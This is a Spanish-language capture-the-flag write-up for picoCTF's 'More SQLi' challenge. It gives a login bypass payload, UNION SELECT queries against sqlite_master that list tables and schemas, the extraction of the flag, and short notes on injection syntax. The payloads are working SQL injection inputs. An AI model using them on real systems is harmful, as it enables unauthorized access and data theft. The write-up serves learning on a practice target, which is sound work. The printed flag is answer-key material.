# Reto: More SQLi

## Descripción

Can you find the flag on this website.

## Solución

Primero necesitamos entrar al sistema. Se nos informa que la query usada es:
```sql
SELECT id FROM users WHERE password = '%s' AND username = '%s'
```
Esta es una query a la que se le puede hacer sql injection si es que el input no está sanitizado. La query que usaremos para romperlo es:
```sql
' OR 1; --
```

Se nos muestra una página que contiene una tabla con tres columnas. Un paso importante es conocer las tablas que contiene esta base de datos:
```sql
' UNION SELECT 1, 2, tbl_name FROM sqlite_master WHERE type='table'; --
```
Esto es exitoso y ahora sabemos que existen las tablas:
- hints
- more_table
- offices
- users

Checamos la estructura de hints:
```sql
' UNION SELECT 1, 2, sql FROM sqlite_master WHERE type = 'table' AND name = 'hints'; --
-- Se nos dice que la tabla hints contiene un campo llamado info.
' UNION SELECT 1, 2, info FROM hints; --
```
La información en hints no fue útil.

Probamos otra tabla:
```sql
' UNION SELECT 1, 2, sql FROM sqlite_master WHERE type = 'table' AND name = 'more_table'; --
-- Se nos dice que la tabla hints contiene un campo llamado flag!
' UNION SELECT 1, 2, flag FROM more_table; --
```

`picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}`

## Notas

La sintaxis básica de una inyección sql es:
- El apóstrofe ' sirve para cerrar la string que se haya puesto en el formato original y que no de error.
- `OR 1;`, esta es una condición que nos asegura que la query regrese `true` sí o sí y el punto y coma termina la sentencia. Esta es la parte con la que más podemos 'jugar' para realizar diferentes acciones.
- `--` Comentario, esto invalida todo lo siguiente.
La query quedaría algo asi:
```sql
SELECT id FROM users WHERE password = '' OR 1; -- AND username = '%s'
```

Después notamos que siempre se incluyen 3 argumentos. Estos tienen que ser utilizados de forma forzosa para que funcione en UNION.
